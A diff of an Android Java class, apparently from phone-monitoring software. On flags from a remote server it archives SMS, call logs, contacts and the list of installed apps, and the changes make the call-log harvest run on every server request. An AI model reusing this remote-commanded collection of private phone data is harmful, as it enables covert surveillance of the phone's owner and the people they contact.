@@ -14,11 +14,11 @@ import android.preference.PreferenceManager;
 import com.inet.android.archive.ArchiveCall;
 import com.inet.android.archive.ArchiveSms;
 import com.inet.android.archive.ListApp;
-import com.inet.android.bs.Caller;
 import com.inet.android.contacts.GetContacts;
 import com.inet.android.db.RequestDataBaseHelper;
 import com.inet.android.db.RequestWithDataBase;
 import com.inet.android.info.GetInfo;
+import com.inet.android.sms.SmsSentObserver;
 import com.inet.android.utils.Logging;
 
 /**
@@ -30,6 +30,7 @@ import com.inet.android.utils.Logging;
 public class PeriodicRequest extends DefaultRequest {
 	private final String LOG_TAG = "PeriodicRequest";
 	static RequestDataBaseHelper db;
+	SmsSentObserver smsSentObserver = null;
 	private final int type = 2;
 	boolean periodicalFlag = true;
 	Context ctx;
@@ -73,10 +74,13 @@ public class PeriodicRequest extends DefaultRequest {
 				str = Caller.doMake(request, "periodic", ctx);
 			} catch (IOException e) {
 				e.printStackTrace();
+				// ----------! exist start request in base ------------------
+
 				db = new RequestDataBaseHelper(ctx);
 
 				if (db.getExistType(type) == false) {
-					db.addRequest(new RequestWithDataBase(request, type));
+					db.addRequest(new RequestWithDataBase(request, type, null,
+							null, null));
 				}
 			}
 			if (str != null) {
@@ -102,7 +106,7 @@ public class PeriodicRequest extends DefaultRequest {
 		Logging.doLog(LOG_TAG, "getResponseData: " + response,
 				"getResponseData: " + response);
 		String statusCallList = "";
-		
+
 		SharedPreferences sp = PreferenceManager
 				.getDefaultSharedPreferences(ctx);
 		Editor ed = sp.edit();
@@ -165,49 +169,6 @@ public class PeriodicRequest extends DefaultRequest {
 				ed.putBoolean("getInfo", false);
 			}
 			ed.putString("period", "1");
-//			String listStr = null;
-//			try {
-//				listStr = jsonObject.getJSONArray("list").toString();
-//				Logging.doLog(LOG_TAG, "list: " + listStr, "list: " + listStr);
-
-//				if (listStr.indexOf("1") != -1) {
-//					// Вызвать метод для списка звонков
-//					Logging.doLog(LOG_TAG, "listStr.indexOf 1",
-//							"listStr.indexOf 1");
-//						
-//					ArchiveCall arhCall = new ArchiveCall();
-//					arhCall.execute(ctx);
-//				}
-//				if (listStr.indexOf("2") != -1) {
-//					// Вызвать метод для списка смс
-//					Logging.doLog(LOG_TAG, "listStr.indexOf 2",
-//							"listStr.indexOf 2");
-//
-//					ArchiveSms arhSms = new ArchiveSms();
-//					arhSms.execute(ctx);
-//					// GetContacts getCont = new GetContacts();
-//					// getCont.execute(ctx);
-//				}
-//				if (listStr.indexOf("3") != -1) {
-//					// Вызвать метод для телефонной книги
-//					Logging.doLog(LOG_TAG, "listStr.indexOf 3",
-//							"listStr.indexOf 3");
-//
-//					GetContacts getCont = new GetContacts();
-//					getCont.execute(ctx);
-//				}
-//				if (listStr.indexOf("4") != -1) {
-//					// Вызвать метод для установленных приложений
-//					Logging.doLog(LOG_TAG, "listStr.indexOf 4",
-//							"listStr.indexOf 4");
-//
-//					ListApp listApp = new ListApp();
-//					listApp.getListOfInstalledApp(ctx);
-//				}
-//			} catch (JSONException e) {
-//				listStr = null;
-//			}
-
 			ed.commit();
 		}
 
@@ -240,6 +201,7 @@ public class PeriodicRequest extends DefaultRequest {
 		}
 		if (str != null) {
 			ed.putString("sms", str);
+
 		} else {
 			ed.putString("sms", "0");
 		}
@@ -253,55 +215,6 @@ public class PeriodicRequest extends DefaultRequest {
 			ed.putString("call", str);
 		} else {
 			ed.putString("call", "0");
-		}
-
-		try {
-			str = jsonObject.getString("telbook");
-		} catch (JSONException e) {
-			str = null;
-		}
-		if (str != null) {
-			ed.putString("telbook", str);
-
-		} else {
-			ed.putString("telbook", "0");
-		}
-
-		try {
-			str = jsonObject.getString("listapp");
-		} catch (JSONException e) {
-			str = null;
-		}
-		if (str != null) {
-			ed.putString("listapp", str);
-		} else {
-			ed.putString("listapp", "0");
-		}
-
-		try {
-			str = jsonObject.getString("arhsms");
-		} catch (JSONException e) {
-			str = null;
-		}
-		if (str != null) {
-			ed.putString("arhsms", str);
-			// ArchiveSms arhSms = new ArchiveSms();
-			// arhSms.execute(ctx);
-		} else {
-			ed.putString("arhsms", "0");
-		}
-
-		try {
-			str = jsonObject.getString("arhcall");
-		} catch (JSONException e) {
-			str = null;
-		}
-		if (str != null) {
-			ed.putString("arhcall", str);
-			// ArchiveCall arhCall = new ArchiveCall();
-			// arhCall.execute(ctx);
-		} else {
-			ed.putString("arhcall", "0");
 		}
 
 		try {
@@ -390,12 +303,12 @@ public class PeriodicRequest extends DefaultRequest {
 		}
 		if (str != null && str.equals("1")) {
 			ed.putString("sms_list", str);
-			ed.putString("statusSMSList", "1");
+			ed.putString("status_sms_list", "1");
 			ArchiveSms arhSms = new ArchiveSms();
 			arhSms.execute(ctx);
 
 		} else {
-			ed.putString("sms_list", "0");
+			// ed.putString("sms_list", "0");
 		}
 		// ---------------apps list------------------------
 
@@ -407,27 +320,28 @@ public class PeriodicRequest extends DefaultRequest {
 
 		}
 		if (str != null && str.equals("1")) {
-			ed.putString("statusAppList", "1");
+			ed.putString("app_list", "1");
 			ListApp listApp = new ListApp();
 			listApp.getListOfInstalledApp(ctx);
 		} else {
-			ed.putString("apps_list", "0");
+			 ed.putString("apps_list", "0");
 		}
 		// ---------------calls list------------------------
 
 		try {
 			str = jsonObject.getString("calls_list");
 			statusCallList = sp.getString("statusCallList", "0");
-			Logging.doLog(LOG_TAG, str, str);
+			Logging.doLog(LOG_TAG, str + statusCallList, str + statusCallList);
 		} catch (JSONException e) {
 			str = null;
 			Logging.doLog(LOG_TAG, "null calls", "null calls");
 		}
-		if (str != null && str.equals("1") && statusCallList.equals("0")) {
-			ed.putString("calls_list", str);
-			ed.putString("statusCallList", "1");
+		if (str != null && str.equals("1")) {
 			ArchiveCall arhCall = new ArchiveCall();
 			arhCall.execute(ctx);
+			ed.putString("calls_list", str);
+			ed.putString("statusCallList", "1");
+
 		} else {
 			ed.putString("calls_list", "0");
 		}
@@ -445,11 +359,10 @@ public class PeriodicRequest extends DefaultRequest {
 			GetContacts getCont = new GetContacts();
 			getCont.execute(ctx);
 		} else {
-			ed.putString("contacts_list", "0");
+			// ed.putString("contacts_list", "0");
 		}
 		// ---------------error------------------------
 
-		
 		try {
 			str = jsonObject.getString("error");
 			if (str.equals("0")) {
